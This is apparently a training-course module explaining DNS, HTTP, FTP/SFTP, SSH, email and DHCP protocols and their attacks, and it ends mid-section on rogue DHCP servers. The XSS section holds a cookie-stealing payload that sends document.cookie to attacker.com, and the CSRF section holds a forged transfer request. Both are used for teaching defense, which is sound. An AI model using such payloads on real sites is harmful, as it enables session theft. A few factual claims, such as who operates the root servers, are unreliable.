# Module 4: Networking Deep Dive (Part 2)

## Table of Contents
1. [Introduction](#introduction)
2. [DNS — Domain Name System](#dns--domain-name-system)
3. [HTTP/HTTPS — Web Protocols](#httphttps--web-protocols)
4. [FTP, SFTP, FTPS — File Transfer](#ftp-sftp-ftps--file-transfer)
5. [SSH — Secure Shell](#ssh--secure-shell)
6. [Email Protocols: SMTP, POP3, IMAP](#email-protocols-smtp-pop3-imap)
7. [DHCP — Dynamic Host Configuration Protocol](#dhcp--dynamic-host-configuration-protocol)
8. [SNMP — Simple Network Management Protocol](#snmp--simple-network-management-protocol)
9. [Hands-on: Protocol Configuration and Capture](#hands-on-protocol-configuration-and-capture)
10. [Summary](#summary)

---

## Introduction

Module 3 covered the foundational layers of networking: how devices communicate (MAC addresses, ARP), how packets are routed (IPv4, IPv6), and how data reliably arrives (TCP, UDP).

Now we move to **Application Layer protocols** — the services and tools that humans and applications actually interact with every day.

This module covers:
- **DNS**: How domain names become IP addresses
- **HTTP/HTTPS**: How web browsers and servers communicate
- **FTP/SFTP/FTPS**: How files are transferred securely
- **SSH**: Secure remote command execution and tunneling
- **Email protocols**: SMTP, POP3, IMAP for sending and receiving email
- **DHCP**: How devices automatically get IP addresses
- **SNMP**: How network administrators monitor devices

Each protocol is an attack surface. Understanding how they work helps you identify vulnerabilities, detect attacks, and defend systems.

---

## DNS — Domain Name System

DNS is the **phone book of the internet**. It translates human-readable domain names (like `google.com`) into IP addresses (like `142.251.41.14`).

Without DNS, you would have to remember IP addresses for every website you visit. Instead, you type a name, and DNS handles the translation.

### DNS Hierarchy

DNS is organized as a **hierarchical, distributed system**:

```
Root Nameservers (.)
    ↓
Top-Level Domain (TLD) Nameservers (.com, .org, .uk, etc.)
    ↓
Authoritative Nameservers (for specific domains like google.com)
    ↓
Recursive Resolvers (what ISPs provide; what your router uses)
    ↓
Your computer / browser
```

#### Root Nameservers

- **What they are**: 13 clusters of servers that know where to find TLD nameservers
- **Why 13?** Historically chosen for DNS protocol efficiency (UDP packet size limits)
- **Run by**: ICANN (Internet Corporation for Assigned Names and Numbers)
- **Location**: Geographically distributed globally; anycast routing means you connect to the nearest one
- **Examples**: A.root-servers.net, B.root-servers.net, ... M.root-servers.net

#### TLD (Top-Level Domain) Nameservers

- **What they are**: Servers that know about all domains in a specific TLD
- **Examples**: 
  - `.com` TLD servers — know about all `.com` domains
  - `.org` TLD servers — know about all `.org` domains
  - `.uk` TLD servers — know about UK domains
  - `.gov` TLD servers — know about US government domains
- **Operated by**: Registry operators (VeriSign operates `.com`, Afilias operates `.org`)

#### Authoritative Nameservers

- **What they are**: Servers that actually hold DNS records for a specific domain
- **Example**: Google's nameservers hold the A record for `google.com` pointing to `142.251.41.14`
- **Who operates them?**: The domain owner or their DNS provider (GoDaddy, Cloudflare, AWS Route53, etc.)
- **What they store**: A, AAAA, CNAME, MX, TXT, NS, SOA records

#### Recursive Resolvers (Local Resolvers)

- **What they are**: Servers that do the work of querying the hierarchy on your behalf
- **Examples**: 
  - Your ISP's resolver (typically provided automatically via DHCP)
  - Google Public DNS (`8.8.8.8`)
  - Cloudflare DNS (`1.1.1.1`)
  - Quad9 DNS (`9.9.9.9`)
- **What they do**: Query root → TLD → authoritative, then cache the result

### DNS Resolution Process

When you type `google.com` in your browser, here's what happens:

```
1. Your browser queries your ISP's recursive resolver
   (e.g., "What is the IP for google.com?")

2. Recursive resolver queries root nameserver
   (e.g., "Who handles .com?")
   Root responds: "Ask VeriSign (TLD server for .com)"

3. Recursive resolver queries TLD nameserver
   (e.g., "Who handles google.com?")
   TLD responds: "Ask Google's nameservers at ns1.google.com, ns2.google.com, etc."

4. Recursive resolver queries authoritative nameserver
   (e.g., "What is the IP for google.com?")
   Authoritative responds: "142.251.41.14 (A record)"

5. Recursive resolver caches the answer and responds to your browser
   Browser caches the answer and connects to 142.251.41.14
```

**Caching at each level:**
- Authoritative nameserver: Long TTL (Time To Live), usually 1+ days
- Recursive resolver: Shorter TTL, typically hours
- Your browser: Even shorter, typically 1–30 minutes
- Your OS: Very short, typically 1–5 minutes

### DNS Record Types

#### A Record (IPv4 Address)

Maps a domain name to an IPv4 address.

```
Example:
google.com    A    142.251.41.14
```

**Used for**: Pointing domain names to web servers, mail servers, etc.

#### AAAA Record (IPv6 Address)

Maps a domain name to an IPv6 address.

```
Example:
google.com    AAAA    2607:f8b0:4004:80a::200e
```

**Used for**: IPv6 connectivity; increasingly important as IPv6 adoption grows.

#### CNAME Record (Canonical Name)

Creates an alias for another domain. Points to another domain name, not an IP.

```
Example:
www.google.com    CNAME    google.com
```

When you visit `www.google.com`, DNS resolves it to `google.com` first, then to its A record.

**Used for**: Load balancing, content delivery, redirecting subdomains.

**Important**: CNAME cannot be used at the zone apex (e.g., you can't have a CNAME for `google.com` itself, only for subdomains).

#### MX Record (Mail Exchange)

Specifies which servers handle email for a domain.

```
Example:
google.com    MX    10    aspmx.l.google.com
google.com    MX    20    alt1.aspmx.l.google.com
google.com    MX    30    alt2.aspmx.l.google.com
```

**Priority**: Lower number = higher priority. The `10` means `aspmx.l.google.com` is the primary mail server; if it's down, use `alt1.aspmx.l.google.com`, etc.

**Used for**: Email routing — tells mail servers where to send email for a domain.

#### TXT Record (Text)

Stores arbitrary text information. Often used for domain verification and security.

```
Example:
google.com    TXT    "v=spf1 include:_spf.google.com ~all"
```

**Common uses**:
- **SPF (Sender Policy Framework)**: Authorizes mail servers that can send email for this domain
- **DKIM (DomainKeys Identified Mail)**: Public key for signing outgoing email
- **DMARC (Domain-based Message Authentication)**: Policy for email authentication
- **Domain verification**: Services like Let's Encrypt put a TXT record to verify domain ownership

#### NS Record (Nameserver)

Specifies which nameservers are authoritative for a domain.

```
Example:
google.com    NS    ns1.google.com
google.com    NS    ns2.google.com
google.com    NS    ns3.google.com
google.com    NS    ns4.google.com
```

**Purpose**: Tells resolvers "for google.com, ask these nameservers."

#### SOA Record (Start of Authority)

Contains metadata about the zone (the DNS domain).

```
Example:
google.com    SOA    ns1.google.com hostmaster.google.com 2023010101 7200 3600 1209600 3600
```

**Fields**:
- Primary nameserver: `ns1.google.com`
- Responsible email: `hostmaster@google.com` (@ replaced with .)
- Serial number: `2023010101` (incremented when zone changes)
- Refresh: `7200` seconds (secondaries refresh every 2 hours)
- Retry: `3600` seconds (retry after failed zone transfer)
- Expire: `1209600` seconds (zone data expires after 14 days if unreachable)
- TTL: `3600` seconds (default TTL for records in this zone)

### DNS Attacks and Vulnerabilities

#### DNS Spoofing (Attacker replies before legitimate server)

**Attack**:
```
1. Attacker intercepts DNS query
2. Attacker responds with malicious IP
3. Victim's computer connects to attacker's IP instead of real website
```

**Example**: Attacker responds to `google.com` query with `attacker.com`'s IP. User visits attacker's site thinking it's Google.

**Defense**: DNSSEC (DNS Security Extensions) — uses cryptographic signatures to verify DNS responses.

#### DNS Cache Poisoning

**Attack**: Attacker injects false DNS records into a resolver's cache, so future queries return the malicious IP.

**Example**: A library's DNS resolver caches a malicious A record for `google.com`. All library users see the attacker's site.

**Defense**: DNSSEC, firewall rules limiting DNS queries from external sources, using trusted resolvers.

#### DNS Amplification DDoS

**Attack**:
```
1. Attacker sends DNS query to public recursive resolver with spoofed source IP (victim's IP)
2. Resolver responds to the victim with large answer
3. Thousands of queries → thousands of large responses flood the victim
```

**Why it works**: DNS responses are often much larger than queries (amplification). One attacker query can result in many victim responses.

**Defense**: Rate limiting on public DNS servers, firewall rules, DDoS mitigation services.

#### DNS Rebinding

**Attack**:
```
1. Attacker controls attacker.com
2. Attacker's JavaScript code on attacker.com queries attacker.com
3. First query: attacker.com → attacker.com (fine, same origin)
4. Attacker changes DNS: attacker.com → 192.168.1.1 (victim's internal network)
5. Second query: attacker.com → 192.168.1.1 (bypasses same-origin policy!)
6. Attacker can now access victim's internal devices (router, printer, etc.)
```

**Defense**: Pinning (browser remembers first IP for a domain), rate limiting DNS changes.

#### Typosquatting (Domain Misspelling)

**Attack**: Register domains similar to legitimate ones.

```
Example:
Legitimate: google.com
Attacker: googel.com (intentional typo)
Attacker: go0gle.com (1 looks like 0)
Attacker: g00gle.com (0 looks like O)
```

Users mistype the URL and land on attacker's site.

**Defense**: User awareness, browser security warnings for suspicious sites, domain registration monitoring.

---

## HTTP/HTTPS — Web Protocols

HTTP (HyperText Transfer Protocol) is the foundation of the web. Every time you visit a website, your browser uses HTTP or HTTPS.

### HTTP Methods

HTTP defines several **methods** (actions) that a client can request:

#### GET

Retrieves data from a server. **Should not modify anything.**

```
GET /search?q=cybersecurity HTTP/1.1
Host: google.com
```

**Characteristics**:
- Parameters in URL (visible, can be bookmarked)
- No request body (data is in the URL)
- Idempotent (multiple identical requests = same as one request)
- Cacheable

**Security note**: GET parameters are visible in browser history and logs. Don't put sensitive data in URLs.

#### POST

Submits data to a server. **Can modify data on the server.**

```
POST /login HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

username=alice&password=secret123
```

**Characteristics**:
- Data in request body (hidden, more secure)
- Not idempotent (multiple identical requests may create multiple resources)
- Not cacheable by default

**Security note**: POST data is still transmitted in plain text over HTTP (not HTTPS). Use HTTPS to encrypt.

#### HEAD

Like GET, but server only returns headers (no body). Used for checking if a resource exists without downloading it.

#### PUT

Replaces an entire resource.

```
PUT /api/users/123 HTTP/1.1
Host: example.com
Content-Type: application/json

{"name": "Alice", "email": "alice@example.com"}
```

**Characteristics**:
- Idempotent (PUT twice = same as PUT once)
- Typically requires authentication

#### DELETE

Removes a resource.

```
DELETE /api/users/123 HTTP/1.1
Host: example.com
```

**Characteristics**:
- Idempotent (delete twice = resource is gone both times)
- Typically requires authentication

#### PATCH

Partially modifies a resource (only the fields you send).

```
PATCH /api/users/123 HTTP/1.1
Host: example.com
Content-Type: application/json

{"email": "newemail@example.com"}
```

Differs from PUT in that PUT replaces the entire resource, while PATCH updates specific fields.

#### OPTIONS

Asks a server what methods are allowed for a resource.

```
OPTIONS /api/users HTTP/1.1
Host: example.com
```

Server responds with:
```
Allow: GET, POST, OPTIONS
```

### HTTP Status Codes

Servers respond with a **3-digit status code** indicating the result:

#### 1xx — Informational

| Code | Meaning | Use |
|------|---------|-----|
| 100 | Continue | "Send the rest of the request body" |
| 101 | Switching Protocols | Upgrading to WebSocket, HTTP/2, etc. |

#### 2xx — Success

| Code | Meaning | Use |
|------|---------|-----|
| 200 | OK | Request succeeded; response body contains data |
| 201 | Created | POST successfully created a new resource |
| 204 | No Content | Request succeeded; no body to return |
| 206 | Partial Content | Range request (resumable downloads) |

#### 3xx — Redirection

| Code | Meaning | Use |
|------|---------|-----|
| 300 | Multiple Choices | Multiple representations available (rare) |
| 301 | Moved Permanently | Resource permanently at new location; update bookmarks |
| 302 | Found | Resource temporarily at new location (most common redirect) |
| 304 | Not Modified | Cached version is still fresh; use it |
| 307 | Temporary Redirect | Like 302 but method stays the same (POST stays POST) |

#### 4xx — Client Error

| Code | Meaning | Use |
|------|---------|-----|
| 400 | Bad Request | Client sent invalid request (malformed URL, syntax error) |
| 401 | Unauthorized | Authentication required (user not logged in) |
| 403 | Forbidden | Authentication succeeded but user lacks permission |
| 404 | Not Found | Resource doesn't exist |
| 429 | Too Many Requests | Rate limiting; client making too many requests |

#### 5xx — Server Error

| Code | Meaning | Use |
|------|---------|-----|
| 500 | Internal Server Error | Server encountered an error (often application crash) |
| 502 | Bad Gateway | Gateway/proxy received invalid response from upstream |
| 503 | Service Unavailable | Server temporarily overloaded or down for maintenance |

### HTTP Headers

Headers provide metadata about requests and responses.

#### Request Headers (Client → Server)

| Header | Example | Purpose |
|--------|---------|---------|
| `Host` | `Host: google.com` | Domain being requested (required in HTTP/1.1) |
| `User-Agent` | `User-Agent: Mozilla/5.0 (Chrome)` | Browser/client identifier |
| `Accept` | `Accept: application/json` | Content types client prefers |
| `Accept-Language` | `Accept-Language: en-US,en;q=0.9` | Preferred language |
| `Referer` | `Referer: https://google.com` | Page where request originated (sic spelling) |
| `Authorization` | `Authorization: Bearer token123` | Authentication credentials |
| `Cookie` | `Cookie: session=abc123; user=alice` | Session and preference data |
| `Content-Type` | `Content-Type: application/x-www-form-urlencoded` | Format of request body (for POST/PUT) |
| `Content-Length` | `Content-Length: 256` | Size of request body in bytes |

#### Response Headers (Server → Client)

| Header | Example | Purpose |
|--------|---------|---------|
| `Content-Type` | `Content-Type: text/html; charset=utf-8` | Format of response body |
| `Content-Length` | `Content-Length: 1024` | Size of response body |
| `Set-Cookie` | `Set-Cookie: session=def456; Path=/; HttpOnly` | Set cookie on client |
| `Location` | `Location: https://new-site.com` | Where to redirect (for 3xx) |
| `Cache-Control` | `Cache-Control: max-age=3600, public` | How long client can cache |
| `Expires` | `Expires: Wed, 21 Oct 2026 07:28:00 GMT` | When cached data expires |
| `Server` | `Server: nginx/1.19.0` | Identifies server software (security risk!) |
| `Strict-Transport-Security` | `Strict-Transport-Security: max-age=31536000` | Force HTTPS for 1 year |
| `X-Content-Type-Options` | `X-Content-Type-Options: nosniff` | Prevent MIME sniffing attacks |

### HTTP Versions

#### HTTP/1.1 (1997 — current standard for most sites)

**Characteristics**:
- Persistent connections (reuse TCP connection for multiple requests)
- Pipelining (send multiple requests without waiting for responses)
- Keep-Alive (hold connection open for reuse)
- Stateless (each request independent)

**Limitations**:
- One request per TCP connection (before keep-alive)
- Large headers repeated on every request
- Head-of-line blocking (if one request slow, others wait)

**Example**:
```
GET /index.html HTTP/1.1
Host: example.com
Connection: keep-alive

HTTP/1.1 200 OK
Content-Type: text/html
Content-Length: 5000

[5000 bytes of HTML]

GET /style.css HTTP/1.1
Host: example.com

HTTP/1.1 200 OK
Content-Type: text/css
Content-Length: 3000

[3000 bytes of CSS]
```

#### HTTP/2 (2015 — optimized for performance)

**Improvements**:
- **Multiplexing**: Multiple requests on one TCP connection simultaneously
- **Binary framing**: Data sent as binary instead of text (more efficient)
- **Header compression**: HPACK compression reduces header size
- **Server push**: Server can send resources before client requests them

**Characteristics**:
- Requires HTTPS (almost all HTTP/2 deployments use TLS)
- Backward compatible with HTTP/1.1

**Performance**: Dramatically faster for multiple requests (no head-of-line blocking).

**Example** (multiplexing):
```
Request 1: GET /index.html (stream 1)
Request 2: GET /style.css (stream 3)
Request 3: GET /script.js (stream 5)

All three run simultaneously on one TCP connection.
```

#### HTTP/3 (2022 — newest, built on QUIC)

**Based on**: QUIC (UDP-based protocol, not TCP)

**Improvements**:
- Faster connection establishment (0-RTT, Zero Round-Trip Time)
- Better mobile experience (connection survives network change)
- All connections encrypted (HTTPS by default)
- Continued multiplexing with reduced head-of-line blocking

**Adoption**: Growing; most browsers and major sites now support it.

### HTTPS (HTTP Secure)

HTTPS wraps HTTP inside **TLS (Transport Layer Security)** encryption. This is HTTP + TLS (formerly called SSL).

#### TLS Handshake (Simplified)

```
1. Client: "Hello, I support TLS 1.3, these cipher suites"
2. Server: "Hello, I choose TLS 1.3 and this cipher suite; here's my certificate"
3. Client: Verifies certificate (is it from a trusted CA? Is it for the right domain?)
4. Client & Server: Perform key exchange (Diffie-Hellman, ECDH)
5. Both: Derive shared session key
6. Connection now encrypted
```

#### Why HTTPS Matters for Security

| Threat | HTTP | HTTPS |
|--------|------|-------|
| Eavesdropping (attacker reads traffic) | Vulnerable | Protected |
| Man-in-the-middle (attacker intercepts) | Vulnerable | Protected (if certificate validated) |
| Modification (attacker changes data) | Vulnerable | Protected (checksum/MAC verified) |

### HTTP Security Issues

#### Session Hijacking

**Attack**:
```
1. Attacker steals session cookie from victim
2. Attacker impersonates victim by using stolen cookie
3. Attacker accesses victim's account
```

**Defense**: Mark cookies with `HttpOnly` flag (inaccessible to JavaScript), use `Secure` flag (only sent over HTTPS), set short expiration times.

#### Cross-Site Scripting (XSS)

**Attack**:
```
Attacker injects JavaScript into a webpage:
<img src=x onerror="fetch('http://attacker.com/steal?data='+document.cookie)">

When a victim views the page, the JavaScript steals their session cookie.
```

**Defense**: Escape user input, use Content Security Policy (CSP), validate and sanitize all input.

#### Cross-Site Request Forgery (CSRF)

**Attack**:
```
1. Victim is logged into their bank
2. Attacker tricks victim into visiting attacker.com
3. Attacker's site contains: <img src="https://bank.com/transfer?to=attacker&amount=1000">
4. Since victim is already logged in, the transfer happens
```

**Defense**: CSRF tokens (server validates token before processing requests), SameSite cookies.

---

## FTP, SFTP, FTPS — File Transfer

Transferring files securely is critical for system administration and data exchange.

### FTP (File Transfer Protocol)

**Port**: 21 (command), 20 (data)
**Encryption**: None (all data in plain text)
**Use**: Legacy systems; generally not recommended

#### How FTP Works

```
1. Client: Connect to server on port 21 (command channel)
2. Server: Ready for commands
3. Client: USER alice
4. Server: Ready for password
5. Client: PASS secret123 (SENT IN PLAIN TEXT!)
6. Server: Login successful
7. Client: PASV (passive mode) or PORT (active mode)
8. Data connection established on port 20 (or negotiated port)
9. Client: RETR file.txt (retrieve file)
10. Server: Sends file.txt over data connection
```

#### Active vs Passive Mode

**Active Mode (PORT)**:
- Client opens data connection back to server
- Client tells server: "I'm listening on port 12345"
- Server connects to client's port 12345
- **Problem**: Firewalls often block incoming connections

**Passive Mode (PASV)**:
- Server opens listening data port (e.g., 50123)
- Server tells client: "Listen on port 50123"
- Client connects to server's port 50123
- **Advantage**: Works through firewalls

**Modern practice**: Passive mode is standard; active rarely used.

#### FTP Vulnerabilities

- **Plaintext credentials**: Username and password sent unencrypted
- **Plaintext data**: File contents sent unencrypted
- **No integrity check**: Attacker can modify files in transit
- **FTP bounce attack**: Attacker uses FTP server to reach other networks

### SFTP (SSH File Transfer Protocol)

**Port**: 22 (same as SSH)
**Encryption**: All data encrypted via SSH
**Authentication**: SSH keys or password
**Use**: Modern standard for secure file transfer

#### How SFTP Works

```
1. SSH handshake on port 22 (authentication, encryption)
2. Once SSH established, SFTP channel opened within SSH tunnel
3. All file transfers encrypted
4. No separate data port (unlike FTP)
```

**Commands** (similar to FTP but with sftp prefix):
```
sftp alice@server.com
get file.txt              # Download file
put file.txt              # Upload file
ls                        # List directory
cd /path                  # Change directory
mkdir newdir              # Create directory
```

**Advantages**:
- Encryption for credentials and data
- Runs on standard SSH port 22
- Better firewall compatibility (single port, no active/passive mode)
- Can use SSH keys (no password needed)

### FTPS (FTP Secure)

**Port**: 21 (with TLS) or 990 (implicit TLS)
**Encryption**: FTP wrapped in TLS, like HTTPS wraps HTTP
**Status**: Newer than SFTP but less common

#### Explicit vs Implicit FTPS

**Explicit (FTPS-E, port 21)**:
```
1. Client connects to port 21
2. Client sends STARTTLS command
3. Upgrade to TLS encryption
4. Continue with encrypted FTP commands
```

**Implicit (FTPS-I, port 990)**:
```
1. Client connects to port 990
2. TLS encryption immediate (before any FTP commands)
3. FTP commands are already encrypted
```

### FTP/SFTP/FTPS Comparison

| Feature | FTP | SFTP | FTPS |
|---------|-----|------|------|
| Encryption | None | SSH (full) | TLS (full) |
| Port | 21 (command), 20 (data) | 22 | 21 or 990 |
| Credentials | Plain text | Encrypted | Encrypted |
| Authentication | Password only | Password or keys | Password or certs |
| Active/Passive | Yes | No (single channel) | Yes |
| Firewall friendly | Poor | Good | Poor |
| Industry standard | Deprecated | Modern | Less common |
| Ease of use | Simple | Simple | Moderate |

**Recommendation**: Use SFTP for all modern systems. Use FTP only for legacy systems with no alternative.

---

## SSH — Secure Shell

SSH is the **secure way to remotely access computers and run commands**. Every system administrator uses it daily.

**Port**: 22
**Encryption**: All data encrypted
**Authentication**: Password or SSH keys (keys preferred)
**Replaces**: Telnet (insecure, plain text)

### SSH Connection Process

```
1. Client: "I want to connect to server.com"
2. Client → Server: SSH handshake on port 22
3. Server: "Here's my public key (fingerprint: ABC123...)"
4. Client: Verifies fingerprint (first time: "Unknown, accept anyway?")
5. Server & Client: Establish shared encryption key
6. Client: "Authenticate as user alice"
7. Client: Sends password (encrypted) OR presents SSH key
8. Server: Validates credentials
9. Connection established
10. All data encrypted in both directions
```

### SSH Authentication Methods

#### Password Authentication

```bash
ssh alice@server.com
Password: (user types password)
```

**Pros**: Simple, no setup
**Cons**: Vulnerable to brute force, password reuse, man-in-the-middle

#### SSH Key Authentication (Public Key Cryptography)

```bash
ssh -i ~/.ssh/id_rsa alice@server.com
(no password prompt; authenticated by key)
```

**How it works**:
```
1. User generates a key pair:
   - Private key (kept secret on user's computer)
   - Public key (placed on server)

2. Connection request:
   - Client proves it has private key by signing a challenge
   - Server verifies with public key
   - No passwords transmitted
```

**Pros**: 
- No passwords to compromise
- Key-based authentication more secure
- Can use passphrase on private key for extra security

**Cons**: 
- Key management (must protect private key)
- Public key cryptography slightly slower

**Best practice**: Use SSH keys for all production systems.

### SSH Tunneling (Port Forwarding)

SSH can **encrypt traffic** for other applications by creating a tunnel.

#### Local Port Forwarding

```bash
ssh -L 8080:internal-server.com:80 alice@jump-server.com
```

**What this does**:
```
1. Local port 8080 forwards to jump-server.com
2. jump-server.com tunnels connection to internal-server.com:80 (encrypted)
3. Visit http://localhost:8080 → actually connects to internal-server:80 securely
```

**Use case**: Accessing internal database or admin panel through a bastion host (jump server)

#### Remote Port Forwarding

```bash
ssh -R 9000:localhost:22 alice@server.com
```

**What this does**:
```
1. Reverse tunnel: server.com:9000 forwards back to your localhost:22
2. Person on server.com can SSH to port 9000 → tunnels to your SSH
```

**Use case**: Allowing remote support; giving someone temporary access to your machine

#### Dynamic Port Forwarding (SOCKS Proxy)

```bash
ssh -D 1080 alice@jump-server.com
```

**What this does**:
```
1. Opens SOCKS proxy on local port 1080
2. All traffic through port 1080 tunnels through jump-server.com
3. Can be used by any application (browser, curl, etc.)
```

**Use case**: Encrypting all traffic through a jump server or VPN-like setup

### SSH Security Issues and Defenses

#### Weak Keys

**Attack**: Attacker tests common SSH keys or predicts keys from weak random generator

**Defense**: Use strong key generation (4096-bit RSA or 256-bit ECDSA minimum), avoid shared keys

#### SSH Key Theft

**Attack**: Attacker steals private key from disk

**Defense**: Encrypt private key with passphrase, use SSH agent for key caching, restrict key permissions (chmod 600)

#### Brute Force on Passwords

**Attack**: Attacker tries common passwords repeatedly

**Defense**: Disable password authentication (keys only), use fail2ban to rate-limit failed attempts, monitor logs for patterns

#### Man-in-the-Middle on First Connection

**Attack**: 
```
1. User connects to new server
2. Attacker intercepts and presents attacker's public key
3. User thinks it's the server and accepts
4. Attacker now sits between user and server, decrypting all traffic
```

**Defense**: Verify SSH fingerprint out-of-band before connecting (phone call, in-person, etc.)

---

## Email Protocols: SMTP, POP3, IMAP

Email involves three protocols: one for sending, one for retrieving.

### SMTP (Simple Mail Transfer Protocol)

**Port**: 25 (plain), 587 (TLS/STARTTLS), 465 (implicit TLS)
**Direction**: Client → Server (sending email)
**Encryption**: Depends on port and configuration

#### How SMTP Works

```
1. Client: Connect to mail server on port 587
2. Server: Ready for SMTP commands
3. Client: STARTTLS (upgrade to encryption)
4. Client: AUTH LOGIN
5. Client: Sends base64-encoded username
6. Client: Sends base64-encoded password
7. Server: Authentication successful
8. Client: MAIL FROM:<alice@example.com>
9. Client: RCPT TO:<bob@example.com>
10. Client: DATA
11. Client: [sends email headers and body]
12. Client: . (period on own line = end of message)
13. Server: 250 Message accepted
14. Client: QUIT
```

#### SMTP Authentication Methods

**PLAIN** (base64 encoded, vulnerable):
```
AUTH PLAIN AHVzZXJuYW1lAHBhc3N3b3Jk
(decodes to: \0username\0password)
```

**LOGIN** (older, also base64):
```
AUTH LOGIN
Username: dXNlcm5hbWU=
Password: cGFzc3dvcmQ=
```

**OAUTH2** (modern, token-based):
```
AUTH XOAUTH2 <token>
(no password sent; uses access token from OAuth provider)
```

**Best practice**: OAUTH2 with TLS on port 587.

#### SMTP Vulnerabilities

**Open Relay**: Mail server accepts messages from anyone to anyone (allows spamming)

**Plaintext credentials**: SMTP on port 25 sends credentials unencrypted

**Email spoofing**: SMTP doesn't require authentication to set MAIL FROM header; attacker can forge sender address

**Defense**: 
- Use STARTTLS on port 587 or implicit TLS on 465
- Disable open relay (require authentication)
- Implement SPF, DKIM, DMARC for email authentication

### POP3 (Post Office Protocol v3)

**Port**: 110 (plain), 995 (SSL/TLS)
**Direction**: Server → Client (retrieving email)
**Model**: Download and delete (or copy)

#### How POP3 Works

```
1. Client: Connect to mail server on port 995 (TLS)
2. Server: +OK POP3 server ready
3. Client: USER alice
4. Server: +OK
5. Client: PASS secret123
6. Server: +OK Logged in
7. Client: LIST (show all messages)
8. Server: 1 512
         2 645
         3 201
9. Client: RETR 1 (retrieve message 1)
10. Server: [sends email]
11. Client: DELE 1 (delete message 1)
12. Client: QUIT
13. Connection closed; deleted messages removed from server
```

#### POP3 Characteristics

- **Download model**: Emails downloaded to client, then deleted from server
- **Offline access**: Once downloaded, email available locally even without internet
- **Simple**: Designed to be lightweight
- **Limitations**: Only one device can access mail; difficult to sync between devices

### IMAP (Internet Message Access Protocol)

**Port**: 143 (plain), 993 (SSL/TLS)
**Direction**: Server → Client (retrieving email)
**Model**: Synchronize; leave on server

#### How IMAP Works

```
1. Client: Connect to mail server on port 993 (TLS)
2. Server: * OK IMAP4 server ready
3. Client: LOGIN alice secret123
4. Server: * OK Logged in
5. Client: SELECT INBOX
6. Server: * 3 EXISTS (3 messages in inbox)
         * FLAGS (\Deleted \Seen \Draft)
7. Client: FETCH 1 BODY[HEADER]
8. Server: [sends message 1 headers]
9. Client: SEARCH UNSEEN (find unread)
10. Server: 1 3 (messages 1 and 3 unseen)
```

#### IMAP Characteristics

- **Synchronization model**: Emails stay on server; flags synchronized across clients
- **Multi-device**: Check email from phone, laptop, computer all in sync
- **Folders**: Support for multiple folders (Inbox, Drafts, etc.)
- **Offline**: Can often read cached messages without connection (dependent on client)
- **Complex**: More protocol overhead than POP3

### IMAP vs POP3 Comparison

| Feature | POP3 | IMAP |
|---------|------|------|
| Port (secure) | 995 | 993 |
| Email storage | Local device | Server |
| Multi-device sync | Poor (conflicts) | Excellent |
| Bandwidth | Downloads all emails | Only requested headers/bodies |
| Offline access | Excellent | Depends on caching |
| Folder support | No | Yes |
| Complexity | Simple | Complex |
| Modern usage | Declining | Standard for modern email |

**Modern standard**: IMAP for personal email, POP3 for legacy or high-volume batch processing.

### Email Security: SPF, DKIM, DMARC

#### SPF (Sender Policy Framework)

**What it is**: DNS TXT record that lists authorized mail servers for a domain

```
example.com    TXT    "v=spf1 include:_spf.google.com include:mailgun.com ~all"
```

**Meaning**: 
- `v=spf1` = SPF version 1
- `include:_spf.google.com` = Allow Google's mail servers
- `include:mailgun.com` = Allow Mailgun servers
- `~all` = Softfail other servers (don't hard reject, but mark suspicious)

**Purpose**: Prevent email spoofing; tells receiving mail servers which servers are authorized to send email for this domain

#### DKIM (DomainKeys Identified Mail)

**What it is**: Cryptographic signature on outgoing email proving it came from the domain

```
Mail server:
1. Signs email with private key (creates signature)
2. Adds signature to email header

Receiving server:
1. Retrieves public key from sender's DKIM DNS record
2. Verifies signature with public key
3. If signature valid: email definitely from domain
4. If signature invalid or missing: email may be spoofed
```

**Purpose**: Prove email authenticity even if SPF is bypassed

#### DMARC (Domain-based Message Authentication, Reporting & Conformance)

**What it is**: Policy that ties SPF and DKIM together; tells receiving servers what to do if authentication fails

```
_dmarc.example.com    TXT    "v=DMARC1; p=reject; rua=mailto:admin@example.com"
```

**Policy options**:
- `p=none` = Accept anyway, but report
- `p=quarantine` = Put in spam folder
- `p=reject` = Hard reject the email

**Purpose**: Prevent domain impersonation; provides policy for handling emails that fail authentication

---

## DHCP — Dynamic Host Configuration Protocol

DHCP automatically assigns IP addresses and network configuration to devices.

**Port**: 67 (server), 68 (client)
**Protocol**: UDP
**Purpose**: Devices don't need manual IP configuration

### DHCP DORA Process

When a device boots up and needs an IP address:

```
1. DISCOVER (D) — Client broadcasts: "Is there a DHCP server?"
2. OFFER (O)     — DHCP server responds: "Yes, here's an IP: 192.168.1.100"
3. REQUEST (R)   — Client broadcasts: "I'm taking the offer from server XYZ"
4. ACK (A)       — Server confirms: "Confirmed, use 192.168.1.100 for 24 hours"
```

#### Detailed Breakdown

**1. DISCOVER**
```
Client: Broadcast from 0.0.0.0:68 to 255.255.255.255:67
DHCP Message Type: Discover
Requested IP: (empty, doesn't know yet)
Client Hardware Address: AA:BB:CC:DD:EE:FF (MAC address)
```

**2. OFFER**
```
DHCP Server: Unicast from 192.168.1.1:67 to 192.168.1.100:68
DHCP Message Type: Offer
Your IP Address: 192.168.1.100
Subnet Mask: 255.255.255.0
Router: 192.168.1.1
DNS: 8.8.8.8
Lease Time: 86400 seconds (24 hours)
Server Identifier: 192.168.1.1
```

**3. REQUEST**
```
Client: Broadcast from 0.0.0.0:68 to 255.255.255.255:67
DHCP Message Type: Request
Requested IP: 192.168.1.100
Server Identifier: 192.168.1.1 (which server?)
```

(Broadcast so that if there are multiple DHCP servers, others know this client picked this server)

**4. ACK**
```
DHCP Server: Unicast from 192.168.1.1:67 to 192.168.1.100:68
DHCP Message Type: ACK
Your IP Address: 192.168.1.100
Subnet Mask: 255.255.255.0
Router: 192.168.1.1
DNS: 8.8.8.8
Lease Time: 86400 seconds
```

### DHCP Lease Renewal

**At 50% of lease time** (12 hours for 24-hour lease):
```
Client sends DHCPREQUEST to same server
Server responds DHCPACK (renews lease)
```

**At 87.5% of lease time** (21 hours):
```
Client broadcasts DHCPREQUEST to any DHCP server
Any DHCP server can respond with DHCPACK (or DHCPNAK if IP no longer available)
```

### DHCP Vulnerabilities

#### DHCP Starvation

**Attack**:
```
1. Attacker sends many DHCP DISCOVER requests with different MAC addresses
2. DHCP server assigns IP addresses to all of them
3. DHCP pool runs out of available IPs
4. Legitimate devices cannot get IP addresses
5. Network becomes unavailable
```

**Defense**: DHCP snooping (limit DHCP requests per port), rate limiting

#### DHCP Spoofing (Rogue DHCP Server)

**Attack**:
```
1. Attacker runs rogue DHCP server on network
